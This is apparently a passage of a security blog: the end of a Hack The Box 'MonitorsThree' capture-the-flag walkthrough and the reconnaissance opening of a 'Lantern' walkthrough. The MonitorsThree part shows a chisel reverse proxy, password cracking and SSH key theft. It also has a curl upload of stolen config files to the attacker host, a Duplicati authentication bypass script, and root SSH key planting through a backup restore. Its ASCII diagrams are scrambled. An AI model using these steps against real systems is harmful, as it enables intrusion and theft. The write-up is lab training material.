Unclear whether or not that worked, but if it did we&rsquo;ll still need a token to be able to interact with it at all. I asked ChatGPT about the token format, and it indicated that the vault token should be something like s.XXXXXXXX where X is an alphanumeric character, and there are at least 6 &ldquo;X&rdquo;:
s\\.[A-Za-z0-9]{6,16} I did a quick scan of the filesystem for anything matching this regex, but I encountered too many false-positives to be able to sift through it manually.
I&rsquo;ll keep an eye out for something of that format, as I continue enumeration.
MySQL After gaining foothold, database credentials are usually a good place to start. I looked up the db.php file that we saw earlier, at /var/www/html/app/admin/db.php:
&lt;?php $dsn = &#39;mysql:host=127.0.0.1;port=3306;dbname=monitorsthree_db&#39;; $username = &#39;app_user&#39;; $password = &#39;php_app_password&#39;; $options = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC, ]; try { $pdo = new PDO($dsn, $username, $password, $options); } catch (PDOException $e) { echo &#39;Connection failed: &#39; . $e-&gt;getMessage(); } Excellent, there&rsquo;s some database credentials in there. That&rsquo;s the database we did the initial SQLi on. To make things a little easier to work with, I&rsquo;ll start up a SOCKS5 proxy.
Aside: SOCKS Proxy using Chisel During user enumeration I found a locally-exposed port 5432 (probably PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.30:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test (attacker -&gt; target -&gt; attacker) to access loading the index page from my local python webserver hosting my toolbox:
proxychains whatweb http://10.10.14.30:8000 The result is my index page - Success &#x1f44d;
With the chisel SOCKS proxy established, I can easily connect to the MySQL database from my attacker machine, using those credentials I just found:
proxychains mysql -h &#39;127.0.0.1&#39; -D &#39;monitorsthree_db&#39; -u &#39;app_user&#39; -pphp_app_password &#x1f605; That&rsquo;s a little faster than a time-based blind SQLi! Although, there doesn&rsquo;t seem to be anything in that database that I didn&rsquo;t already know about. Is there anything else we can do from MySQL? I tried:
Seeing if there was another database to access from this user (there isn&rsquo;t) Reading and writing files (Don&rsquo;t have the permissions) How about the other application, Cacti - there are probably database credentials somewhere&hellip; Some web searching revealed that (in step 5) of the official configuration guide for Cacti it notes that the database config should be in include/config.php - Indeed, we find a bunch of MySQL-related info in /var/www/html/cacti/include/config.php:
$database_type = &#39;mysql&#39;; $database_default = &#39;cacti&#39;; $database_hostname = &#39;localhost&#39;; $database_username = &#39;cactiuser&#39;; $database_password = &#39;cactiuser&#39;; $database_port = &#39;3306&#39;; $database_retries = 5; $database_ssl = false; $database_ssl_key = &#39;&#39;; $database_ssl_cert = &#39;&#39;; $database_ssl_ca = &#39;&#39;; $database_persist = false; Let&rsquo;s connect to it and see if there&rsquo;s anything useful:
proxychains mysql -h &#39;127.0.0.1&#39; -D &#39;cacti&#39; -u &#39;cactiuser&#39; -pcactiuser There are a lot of tables in this database, as expected. The user_auth table stands out right away as a place that credentials might reside:
Perfect! Those look like bcrypt hashes.
Password cracking Let&rsquo;s get cracking:
&#x1f447; Remember that we already know the password for admin is greencacti2001, so there&rsquo;s no point in waiting for that one to crack.
PASSWDS=/usr/share/wordlists/rockyou.txt john --wordlist=$PASSWDS --format=bcrypt cacti_users_auth.hash &#x1f602; That is a top-notch password, marcus.
We already know that password-based authentication for SSH is disabled, so can we privesc via just su?
su marcus # use password: 12345678910 Yes, we can! &#x1f606;
SSH key First, I&rsquo;ll check if marcus has an SSH key:
ls -lahR /home/marcus Yep - there&rsquo;s a private key exactly where we&rsquo;d expect it to be, if one is present. Let&rsquo;s take a copy - no need to do any fancy file transfer:
cat /home/marcus/.ssh/id_rsa # copy to clipboard Now on the attacker host, let&rsquo;s use the key to log in as marcus:
vim loot/id_rsa # paste from clipboard chmod 600 loot/id_rsa ssh -i loot/id_rsa marcus@$RADDR The user flag is in the usual spot - go ahead and read it for the points:
cat /home/marcus/user.txt ROOT FLAG I&rsquo;ll admit, I was really hoping to find a vault token somewhere in /home/marcus. Hmm&hellip;
Local enumeration - marcus As one of the first steps of local enumeration, I checked again for listening services (mostly, to see if they were labeled with the listening application/process instead of just the port and address). Port 8200 was there, but still unlabeled - since can use SSH to connect now, it&rsquo;s easier to simply forward that port instead of relying on a SOCKS proxy:
ssh -i loot/id_rsa -L 8200:localhost:8200 marcus@$RADDR With that port forwarded, it&rsquo;s now even easier to navigate to it in a browser (we already knew it was listening for HTTP):
&ldquo;Duplicati&rdquo;, that&rsquo;s interesting. It&rsquo;s not Hashicorp Vault, as I had previously thought. I tried some of the known credentials and obvious guesses, but nothing is working. I&rsquo;ll certainly return to this once I know more &#x1f6a9;
As I was continuing through my local enumeration checklist, I found something interesting - I checked for any docker configurations:
find / -name &#34;dockerfile&#34; -o -name &#34;docker-compose.yml&#34; 2&gt;/dev/null This found /opt/docker-compose.yml, which appears to be a the configuration for the Duplicati service running on port 8200:
version: &#34;3&#34; services: duplicati: image: lscr.io/linuxserver/duplicati:latest container_name: duplicati environment: - PUID=0 - PGID=0 - TZ=Etc/UTC volumes: - /opt/duplicati/config:/config - /:/source ports: - 127.0.0.1:8200:8200 restart: unless-stopped It&rsquo;s looking pretty certain that we&rsquo;re heading in the right direction now &#x1f609;
The volume mapping looks a little odd. Why would they map the filesystem root / to /source? Also, this duplicati instance seems like it&rsquo;s running as root internally.
Can we just hop into the container, check out /source/root/root.txt and be done?
&#x1f602; Haha nope&hellip; That would be too easy!
Duplicati So what is Duplicati, anyway? I had to do a little research about it. Turns out that it&rsquo;s a tool for taking backups. It&rsquo;s a bit of a hybrid between full and incremental backups, plus a little bit of cryptographyso you can prove backup integrity.
They have an article describing how it works on their forum. It&rsquo;s definitely worth reading.
&#x1f601; Honestly, it&rsquo;s really cool! Duplicati seems very useful and uses some clever ideas.
The /config volume from the previous docker-compose.yml file seems a little interesting. Let&rsquo;s examine it more closely:
I&rsquo;ll exfil it using a file upload. On the attacker host, I&rsquo;ll start up an http server:
cd www sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v Now, as marcus, I&rsquo;ll archive the directory and upload the resulting file:
tar -czvf /tmp/.Tools/config.tar.gz config/ curl -X POST -F &#39;file=@/tmp/.Tools/config.tar.gz&#39; http://10.10.14.30:8000 &#x1f4a1; It would have been faster and more direct to just use scp to transfer the directory, but whatever
Let&rsquo;s take a look at it:
mv www/config.tar.gz loot/ &amp;&amp; cd loot tar -zxvf config.tar.gz sqlite3 Duplicati-server.sqlite # sqlite&gt; .schema The schema is a little confusing, but mentions a lot of stuff that would be important for a backup service.
Looking through the database, I noticed some things:
Backup references a file we&rsquo;ve already obtained: The Option table shows something that might be a valid passphrase: There&rsquo;s a passphrase and a salt, but for Backup ID 4 we see that --no-encryption is set to true. If I&rsquo;m understanding Duplicati correctly, this would have been the passphrase and salt for an encrypted backup&hellip; so why is it here? There are a few errors for Backup ID 4 in the error log. I did a web search for &ldquo;Duplicati passphrase&rdquo; to find out more, and immediately stumbled across a page by a security researcher. As it turns out, they found a way to bypass the Duplicati web authentication by using the passphrase and salt &#x1f911; That&rsquo;s exactly what I needed!
This whole plan relies on the salt still being valid. This is easily verifiable, though.
Running a single authentication attempt (with a random password) through the login page, we can see that it provides the same salt as seen above:
Checking out the Duplicati github repo, I found that the researcher reported this issue, and it was since solved. It might still be worth checking for it though.
Normally, this is how the authentication would work:
┌ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ └ ─ C c ─ ─ L l - ─ ─ I ┌ ▼ i s │ └ ─ ─ E ─ e i ─ ─ ─ N ─ n d J ─ ─ ─ T ─ t e S ► ─ ┐ │ │ │ │ │ │ │ │ ┤ │ │ │ │ │ │ │ │ │ │ ┘ ─ ◄ ─ ◄ W ─ ─ O h a ─ ─ h ─ ─ K a n ─ ─ W a ─ ─ . s d ─ ─ e t ─ ─ h ─ ─ b ' ─ ─ H e s ─ ─ s ─ ─ e d a ─ y ─ a ─ ─ r l ─ o ─ p m ─ ─ e u t ─ L r u ─ D p y ─ H ─ ' s . ─ o e r ─ U ─ e ─ s i ─ o d ─ P a n ─ r ( ─ n ─ k i c ─ L u o ─ e a ─ m g ─ s r u ─ I t n ─ ' n ─ y ─ e r ─ C h c ─ s d ─ t ─ g c r ─ A e e ─ ─ p h ─ o t e ─ T n ? ─ y y ─ a a ─ o n ─ I t ─ o o ─ s t ─ d y t ─ i ─ u u ─ s ─ . o ─ c ─ r r ─ w n ─ u s ─ a ─ ─ o o ─ I e ─ t ─ n s ─ r n ─ u s ─ i ─ o a ─ d c ─ w s s ─ o ─ n l ─ , e ─ i i i ─ n ─ c t ─ ─ l n o ─ ─ e ) ─ ─ l g n ─ ► ─ ► ─ ┌ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ┤ └ ─ S ─ ─ E ─ ─ R ─ ─ V ─ ─ E ─ ─ R ─ ┐ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ┘ However, we will instead circumvent part of the client-side javascript. We&rsquo;ll provide a pre-hashed password (the one we found in the Option table) instead of using the client-side javascript to calculate the hash.
Let&rsquo;s try out this procedure using ZAP.
First, get the hex encoding of the passphrase we found in the database. You could do this in bash, but here&rsquo;s the cyberchef recipe anyway:
Next, tell ZAP to Break on all requests and responses:
Enter an arbitrary password into the Duplicati login page:
The request should be proxied through ZAP. It should be a POST request with a body of get-nonce=1 indicating that we are requesting the nonce and the known salt. Submit and Step once, into the response to this request:
The salt and nonce are provided:
Copy the base-64 nonce from ZAP and the hex passphrase from Cyberchef into the following script:
var saltedpwd = &#39;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a&#39;; var b64nonce = &#39;7kDw6qZ5AAOZqM0WLEyT/tZbHxDRhLV56Hwr1s+iJV0=&#39; var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(b64nonce) + saltedpwd)).toString(CryptoJS.enc.Base64); console.log(noncedpwd); Paste the script into the browser console to evaluate it:
Copy the value of noncedpwd that it prints. In ZAP, Submit and Step once more, into the POST request that has a password hash for a body. Paste our calculated noncedpwd value into that spot. Select the value, and open it in Encode/Decode/Hash:
Replace the value in the POST body with the URL-encoded version of itself:
Finally, select Submit and Continue to forward our calculated password, that has been hashed using the provided nonce:
Checking the browser window again, we can see that the authentication was indeed bypassed!
Not working? Yeah, I couldn&rsquo;t get it working for a very long time.
The auth bypass would go perfectly, but then the app would fail to load! All I got was this:
Basically, it looked like Angular wasn&rsquo;t running, or there was some kind of templating problem..? So weird.
The troubleshooting took a very long time, but ultimately I found a solution: Use Burpsuite, with its built-in Chromium browser.
&#x1f61e; After switching to Chromium, the app loaded perfectly.
The only difference when performing the auth bypass using Burp instead of ZAP is how you specify to proxy the response to the request. Do this after intercepting the initial get-nonce request:
Privesc planning After taking a look through the Duplicati interface, I think I see the misconfiguration. Due to the &ldquo;strange&rdquo; volume mapping that I saw in the docker-compose.yml file, we have overly permissive access to the whole filesystem using Duplicati.
It seems like Duplicati allows us not only to take backups of arbitrary sources, but also to &ldquo;restore&rdquo; backups to arbitrary destinations! By abusing this, we can indirectly plant an SSH key for the root user.
┌ │ │ │ │ │ │ │ └ ─ ─ ─ ► ┌ │ ┤ └ ┌ │ │ └ ┌ │ │ └ ─ P i ─ ─ B i ─ ─ " i ─ ─ l n ─ ─ a n ─ ─ R n ─ ─ a ─ ─ c t ─ ─ e t ─ ─ c c ─ ─ k o ─ ─ s o ─ ─ e h ─ ─ ─ ─ t ─ ─ o ─ ─ u a ─ ─ o t ─ ─ f s ─ ─ p n ─ ─ r a ─ ┌ │ ▼ ─ i e ┬ │ ▼ ─ o ┬ │ ▼ ─ e r ┬ │ └ ─ ─ l n ─ ─ f t ─ ─ " g ─ ─ ─ ─ e ─ ─ i h ─ ─ e ─ ─ ─ ─ s d ─ ─ l e ─ ─ f t ─ ─ ─ ─ i ─ ─ e r ─ ─ i ─ ─ ─ ─ r ─ ─ s ─ ─ l d ─ ─ ─ ─ ─ ─ d ─ ─ e i ─ ─ ─ ─ ─ ─ i ─ ─ s r ─ ─ ─ ─ ─ ─ r ─ ─ ─ ► ┐ │ │ ┘ ┐ │ │ ┘ ┐ │ │ ┘ S S S / / / S H t t r H m m o a p p o a s / / t s B B / m a a . r a c c s o r k k s o c u u h t u p p / s s s / / S D o e u s r t c i e n a t i o n To prepare, let&rsquo;s first generate an ssh key, and use an http server to transfer it to where marcus can use it:
cd loot ssh-keygen -t rsa -b 4096 -f root_id_rsa -N &#39;hawk.hawk&#39; chmod 600 root_id_rsa base64 -w 0 root_id_rsa.pub Next make the Source and Destination directories using the marcus shell and download the key:
mkdir -p /tmp/Backups/Source mkdir -p /tmp/Backups/Destination curl -o /tmp/Backups/Source/authorized_keys http://10.10.14.10:8000/root_id_rsa.pub Privesc execution Making the backup The existing backup operation doesn&rsquo;t do what we need it to do. Let&rsquo;s define a new one that backs up the /tmp/Backups/Source directory into /tmp/Backups/Destination.
&#x1f447; Remember, the docker volume is mapped as /:/source, so we will need to prefix all filepaths with /source
Setting up the backup:
I gave it an arbitrary name, and specified that no encryption should be used. Used /source/tmp/Backups/Destination as the backup Destination Used /source/tmp/Backups/Source/authorized_keys as the backup Source Give it a schedule to run every minute Retain only one backup. No need to bloat the filesystem &#x2b50; After hitting Save&hellip; nothing happend. Nothing happened for a LONG time. My best advice is to really mash that button. It only happened after maybe the tenth time I tried it.
&#x26a0;&#xfe0f; EDIT (thank you, @x6h057)
It turns out that this method works perfectly the first time if the Run again every parameter is set to a value greater than 5 minutes. If you set this to 6 minutes, it should work find.
Eventually, my backup operation appeared, and seems successfully defined:
After clicking the Run now text, I was shown a short success message. The results are visible from the marcus shell:
Restoring the backup Now that we have a valid Duplicati archive, we can &ldquo;restore&rdquo; the backup into our target directory. The zip files shown above will actually just unpack as authorized_keys.
We can now choose the Restore operation from the sidebar. Select the Keys backup to restore from:
The most important thing is to choose an alternate destination for the files, instead of restoring them to the backup source directory:
This attempt seems successful:
There&rsquo;s only one way to find out if it worked. Let&rsquo;s try connecting using SSH!
&#x1f389; We have a root shell! Read the flag in the usual spot to finish off the box:
cat /root/root.txt EXTRA CREDIT Cleanup scripts: In case you were wondering, here&rsquo;s the script that cleans up the Cacti resources directory, so that peoples exploits don&rsquo;t accumulate:
#!/bin/bash DIR=&#34;/var/www/html/cacti/resource&#34; KEEP_FILES=(&#34;index.php&#34; &#34;script_queries&#34; &#34;script_server&#34; &#34;snmp_queries&#34;) for FILE in &#34;$DIR&#34;/*; do FILENAME=$(basename &#34;$FILE&#34;) FOUND=false for KEEP_FILE in &#34;\${KEEP_FILES[@]}&#34;; do if [[ &#34;$FILENAME&#34; == &#34;$KEEP_FILE&#34; ]]; then FOUND=true break fi done echo &#34;Processing file: $FILENAME&#34; if [ &#34;$FOUND&#34; = true ]; then echo &#34;File is in the list of files to keep.&#34; else echo &#34;File will be deleted.&#34; fi if [ &#34;$FOUND&#34; = false ]; then rm -rf &#34;$FILE&#34; echo &#34;Deleted file: $FILENAME&#34; fi done CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f5fa;&#xfe0f; Write some SQL queries that are pre-optimized for time-based blind SQLi. This can greatly speed up database enumeration, and it&rsquo;s definitely something I should have done on this box. By &ldquo;pre-optimized&rdquo; I mean writing the query to be insensitive to column names, or usernames, etc. We can already use certain flags with SQLMap to search for common table names, so why not also write a query that simultaneously dumps contents of any column named &ldquo;pass&rdquo;, &ldquo;password&rdquo;, &ldquo;token&rdquo;, &ldquo;passwd&rdquo;, etc. Any maybe pre-filter it for only known users (we already knew admin was a user, and could have easily guessed marcus, too)
&#x1f310; Have a few browsers on-hand. If something seems like it really should be working, maybe it&rsquo;s time to try again but with a different browser. I do most of my work using Firefox, but I&rsquo;m beginning to see the advantage of using the Burp-integrated Chromium or the ZAP-integrated firefox as well.
&#x1f57a; Figure out ways to skip re-exploiting the box when the connection breaks. For example, if you&rsquo;ve found a way to upload a webshell, and know that you can open a reverse shell using that webshell, it&rsquo;ll be a time-saver to edit your exploit to just upload a reverse shell instead!
Defender &#x1f199; Do your updates. The vulnerability we exploited in Cacti for file upload was very well-known. It&rsquo;s especially important to keep internet-facing systems updated - even moreso when large security-related patches are released.
&#x1f4be; Be mindful of your volume mapping. As soon as I saw the flawed docker-compose.yml on this box, I knew for sure that the volume mapping would be involved in privesc. Having overly permissive volume mapping means that directories on the host system are exposed to the container as well - so a mapping like /:/source effectively doubles the attack surface!
&#x1f4c2; Take care of permissions on files that contain secrets. On this box, the marcus user (and maybe even www-data? I forgot to check ) had access to the config files of Duplicati. This is a big problem, as it essentially extends trust of the whole Duplicati system onto the users who can access the configs. A much better solution would have been to create the configs, a system account for Duplicati, then change permissions and ownership of the configs so only the Duplicati system account can run the Duplicati container and read the configs.
`,url:"https://4wayhandshake.github.io/walkthrough/monitorsthree/"},"https://4wayhandshake.github.io/walkthrough/lantern/":{title:"Lantern",tags:["Blazor","SSRF","LFI","Javascript Override","Reverse Engineering","C#","SQLite","Syscalls","Process Monitor"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION Is it Linux? I&rsquo;m not so sure&hellip; &#x1f914;
Lantern, the third box in HTB&rsquo;s Season 6 Heist, claims to be a Linux box, but in most respects actually it&rsquo;s actually running things as one might in Windows. It isn&rsquo;t until the very end of privesc to root that we find anything Linux-specific. Lantern is about a generic IT services company running a landing page and an admin panel. What made this one a little special is its extensive use of Blazor.
Recon doesn&rsquo;t need to take very long on this one. Don&rsquo;t waste too much time enumerating the Blazor service - directory and file enumeration won&rsquo;t work normally on a websocket-based application. Quickly identify what applications are running (a certain reverse proxy, and Blazor), and start with some vulnerability research.
Foothold is tough on Lantern. It took me the most time. Your research should guide you towards an SSRF vulnerability. You can utilize the SSRF to enumerate the internally-reachable services. Some browser reconfiguration will allow you to comfortably re-use your SSRF technique to access the discovered service. From there, observe how the service works and you&rsquo;ll find yourself obtaining a database as some loot. Inside the database, there will be details you haven&rsquo;t seen before - some credentials leading to the admin dashboard.
The admin dashboard provides an unexpectedly large attack surface, but in isolation each of the vulnerabilities are useless. The admin dashboard challenges you to find and exploit three different vulnerabilities and combine them into one attack to gain a foothold. This part takes a little programming to accomplish - be sure to check my Github if you get stuck. Thankfully, foothold leads straight to the user flag.
Privesc to root is much more direct, but also very challenging. Even though you&rsquo;ll see an obvious path forward, be sure to take the time to follow your usual enumeration process. Without covering the basics, following the &ldquo;obvious&rdquo; path will lead to a confusing dead end. Finally, a little SQL prowess will gain you the root password, and the flag that goes with it.
Lantern was medium length, but high complexity. It took a lot of web app pentesting knowledge to gain a foothold, but then root privesc was all about understanding the operating system.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA) |_ 256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519) 80/tcp open http Skipper Proxy |_http-title: Did not follow redirect to http://lantern.htb/ |_http-server-header: Skipper Proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Not Found | Content-Length: 207 | Content-Type: text/html; charset=utf-8 | Date: Mon, 19 Aug 2024 03:49:13 GMT | Server: Skipper Proxy | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;404 Not Found&lt;/title&gt; | &lt;h1&gt;Not Found&lt;/h1&gt; | &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt; | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Length: 225 | Content-Type: text/html; charset=utf-8 | Date: Mon, 19 Aug 2024 03:49:08 GMT | Location: http://lantern.htb/ | Server: Skipper Proxy | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;Redirecting...&lt;/title&gt; | &lt;h1&gt;Redirecting...&lt;/h1&gt; | &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&#34;http://lantern.htb/&#34;&gt;http://lantern.htb/&lt;/a&gt;. If not, click the link. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, HEAD, OPTIONS | Content-Length: 0 | Content-Type: text/html; charset=utf-8 | Date: Mon, 19 Aug 2024 03:49:08 GMT |_ Server: Skipper Proxy 3000/tcp open ppp? | fingerprint-strings: | GetRequest: | HTTP/1.1 500 Internal Server Error | Connection: close | Content-Type: text/plain; charset=utf-8 | Date: Mon, 19 Aug 2024 03:49:12 GMT | Server: Kestrel | System.UriFormatException: Invalid URI: The hostname could not be parsed. | System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions&amp; creationOptions) | System.Uri..ctor(String uriString, UriKind uriKind) | Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value) | Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri) | Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri) | Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.&lt;InitializeStandardComponentServicesAsync&gt;g__InitializeCore|5_0(HttpContext httpContext) | Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC | HTTPOptions: | HTTP/1.1 200 OK | Content-Length: 0 | Connection: close | Date: Mon, 19 Aug 2024 03:49:17 GMT | Server: Kestrel | Help: | HTTP/1.1 400 Bad Request | Content-Length: 0 | Connection: close | Date: Mon, 19 Aug 2024 03:49:12 GMT | Server: Kestrel | RTSPRequest: | HTTP/1.1 505 HTTP Version Not Supported | Content-Length: 0 | Connection: close | Date: Mon, 19 Aug 2024 03:49:18 GMT | Server: Kestrel | SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Length: 0 | Connection: close | Date: Mon, 19 Aug 2024 03:49:33 GMT |_ Server: Kestrel OpenSSH running on port 22 is a little bit out-of-date. Port 80 looks typical; there&rsquo;s a redirect to http://lantern.htb. Port 3000 is a bit of an oddity though - even though this is a Linux target, it&rsquo;s running Microsoft ASP.NET. My early guess is that it&rsquo;s some kind of API?
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No additional info
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 88/udp open|filtered kerberos-sec 111/udp open|filtered rpcbind 123/udp open|filtered ntp 177/udp open|filtered xdmcp 443/udp open|filtered https 497/udp open|filtered tcpwrapped 631/udp open|filtered tcpwrapped 998/udp open|filtered tcpwrapped 999/udp open|filtered tcpwrapped 1434/udp open|filtered ms-sql-m 1719/udp open|filtered h323gatestat 1900/udp open|filtered upnp 2049/udp open|filtered nfs 4500/udp open|filtered tcpwrapped 5000/udp open|filtered tcpwrapped 10000/udp open|filtered ndmp 32771/udp open|filtered sometimes-rpc6 49152/udp open|filtered unknown 49154/udp open|filtered unknown 49186/udp open|filtered unknown 49188/udp open|filtered unknown 49192/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy (Port 80) Noting the redirect from the nmap scan, I added lantern.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=lantern.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Alright, that&rsquo;s the expected result. Nothing else though. Now I&rsquo;ll check for subdomains of lantern.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No results. I&rsquo;ll move on to directory enumeration on http://lantern.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o fuzzing/ffuf-directories-root -of json -e .php,.js,.html,.txt -timeout 4 -v WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o fuzzing/ffuf-directories-root -of json -e .php,.asp,.js,.html,.txt -timeout 4 -v Directory enumeration against http://[domain].htb/ gave the following:
Webserver Strategy (Port 3000) From the nmap scans earlier, we saw what appears to be a webserver (probably running an API?) on port 3000, so let&rsquo;s check that out.
whatweb --aggression 3 http://$RADDR:3000 Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR:3000/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v -fs 0 No results. Perhaps this port doesn&rsquo;t have a vhost set up? I&rsquo;ll move on to directory enumeration on port 3000:
Instead of a 404, this service replies with a HTTP 200: Sorry, there's nothing at this address., so we&rsquo;ll filter that out.
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://lantern.htb:3000/FUZZ -t 80 -c -o fuzzing/ffuf-directories-3000 -of json -e .php,.asp,.js,.html,.txt -timeout 4 -v -fw 334 Directory enumeration gave the following:
Since I suspect this might be an API, I&rsquo;ll also enumerate HTTP methods (verbs):
WLIST=/usr/share/seclists/Fuzzing/http-request-methods.txt ffuf -w $WLIST:FUZZ -u http://$RADDR:3000 -X FUZZ -t 80 -c -o fuzzing/ffuf-methods-3000 -of json -timeout 4 -v At the root directory, the server responds to OPTIONS, HEAD, TRACE, and GET.
Oddly, it seems like the /error directory responds to any HTTP verb:
The only discerible difference is that the Request ID portion is only generated for GET requests.
We can see by checking either http://$RADDR:3000/css/site.css or the page source of any of the &ldquo;404&rdquo; pages that port 3000 is using Blazor (like a .NET template engine for web):
Checking the browser dev tools console, I see a few messages about disconnection from the websocket at ws://10.129.193.133:3000/_blazor?id=m0govWITgcssiMRlB2vCsg. This reminds me that Blazor is websocket-based, so it may be using stateful interactions, unlike a REST API. That makes it a lot harder to test.
Dealing with Blazor is a lot more difficult than a regular HTTP server. Due to the way it loads documents, it seems like we can&rsquo;t actually do effective directory or file enumeration with it. For example, when I did directory and file enumeration earlier, my wordlist definitely contained the obvious pages like &ldquo;index&rdquo;, &ldquo;admin&rdquo;, and &ldquo;login&rdquo;&hellip; But when I did a spot-check on some of these terms just now, I ended up finding a /login page:
&#x1f62c; This is going to be tricky!
Regardless, now that I&rsquo;ve found a login form, I&rsquo;ll be sure to come back and check it later for auth bypass or SQLi &#x1f6a9;
Exploring the Website The HTTP server running on port 80 appears to be a landing page for an IT and development services company. Running the site through ZAP Spider shows that we probably got all of the linked content during directory enumeration earlier:
The index page is seemingly unimportant boilerplate/template content.
The only functional link in the navbar is the Vacancies button, leading to /vacancies. There are three jobs posted. Probably unimportant, but these can be useful OSINT because it might hint at what technologies or versions the company frequently uses:
&#x1f63f; I&rsquo;m qualified for all of these (aside from Azure)&hellip; ++pain; If anyone is interested in hiring me for remote work. Please get in touch &#x1f605;
The most interesting part about this page is at the bottom; there is a section to upload a resume!
Resume uploads are the best! People submit resumes in all kinds of insecure formats. Hopefully, this will lead to a larger-than-necessary attack surface &#x1f44d;
